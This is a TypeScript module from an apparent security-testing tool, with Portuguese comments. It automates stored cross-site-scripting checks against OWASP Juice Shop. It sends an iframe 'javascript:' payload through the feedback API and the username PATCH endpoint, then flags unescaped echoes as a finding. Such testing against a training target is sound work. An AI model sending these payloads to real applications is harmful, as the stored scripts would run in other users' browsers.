/**
 * executor/tasks/AbuseXSS.ts
 * ---------------------------------------------------------------
 * Abuse Case: Cross-Site Scripting (XSS) Armazenado
 *
 * Testa dois vetores de XSS no Juice Shop:
 *
 * 1. Stored XSS via API de Feedbacks — injeta um payload no campo
 *    'comment'. Se o backend não sanitizar e o frontend renderizar
 *    o conteúdo como HTML, o script será executado para qualquer
 *    usuário que visualizar os feedbacks.
 *
 * 2. Stored XSS via nome de usuário — altera o nome do perfil do
 *    usuário para um payload XSS via PATCH /api/Users/:id.
 *
 * Detecção: verifica se o payload retorna na resposta sem
 * escapamento (ex: '<script>' em vez de '&lt;script&gt;').
 *
 * Juice Shop Challenge: "Perform a persisted XSS attack"
 * Categoria OWASP: A03:2021 – Injection (XSS)
 * CWE-79: Improper Neutralization of Input During Web Page Generation
 * ---------------------------------------------------------------
 */

import axios from 'axios';
import { Finding } from '../ActionDispatcher';

const XSS_PAYLOAD = '<iframe src="javascript:alert(`xss`)">'; // payload clássico do Juice Shop

export async function abuseXSS(
  jwt: string,
  baseUrl: string,
): Promise<Finding | null> {
  const headers = {
    'Authorization': `Bearer ${jwt}`,
    'Content-Type':  'application/json',
  };

  const vulnerableVectors: string[] = [];
  let evidence = '';

  // ── Vetor 1: Stored XSS via Feedback ───────────────────────
  try {
    const feedbackRes = await axios.post(
      `${baseUrl}/api/Feedbacks`,
      {
        comment:   `${XSS_PAYLOAD}`,
        rating:    1,
        captchaId: 0,
        captcha:   '0',
      },
      { headers, validateStatus: () => true, timeout: 10_000 },
    );

    if (feedbackRes.status === 200 || feedbackRes.status === 201) {
      const body = JSON.stringify(feedbackRes.data);
      // Verifica se o payload foi armazenado sem escapamento
      if (body.includes('<iframe') || body.includes('javascript:')) {
        vulnerableVectors.push(
          `POST ${baseUrl}/api/Feedbacks — payload armazenado sem sanitização (HTTP ${feedbackRes.status})`
        );
        evidence += `Feedback response: ${body.substring(0, 200)}\n`;
      }
    }
  } catch {
    // vetor indisponível, continua
  }

  // ── Vetor 2: Stored XSS via nome de usuário ─────────────────
  try {
    // Obtém o ID do usuário atual
    const whoamiRes = await axios.get(`${baseUrl}/rest/user/whoami`, {
      headers,
      validateStatus: () => true,
      timeout: 10_000,
    });

    const userId: number | undefined = whoamiRes.data?.user?.id;

    if (userId) {
      const patchRes = await axios.patch(
        `${baseUrl}/api/Users/${userId}`,
        { username: XSS_PAYLOAD },
        { headers, validateStatus: () => true, timeout: 10_000 },
      );

      if (patchRes.status === 200) {
        const body = JSON.stringify(patchRes.data);
        if (body.includes('<iframe') || body.includes('javascript:')) {
          vulnerableVectors.push(
            `PATCH ${baseUrl}/api/Users/${userId} — username salvo com XSS payload (HTTP ${patchRes.status})`
          );
          evidence += `User patch response: ${body.substring(0, 200)}\n`;
        }
      }
    }
  } catch {
    // vetor indisponível, continua
  }

  if (vulnerableVectors.length === 0) return null;

  return {
    title:       'Cross-Site Scripting (XSS) Armazenado',
    severity:    'HIGH',
    category:    'XSS_STORED',
    description:
      'A aplicação armazena e reflete payloads XSS sem sanitização adequada. ' +
      'Conteúdo injetado via API é persistido e potencialmente renderizado como HTML ' +
      'no navegador de outros usuários, permitindo execução arbitrária de scripts.',
    steps: [
      `Payload utilizado: ${XSS_PAYLOAD}`,
      ...vulnerableVectors,
    ],
    evidence:     evidence.trim(),
    discoveredAt: new Date(),
  };
}
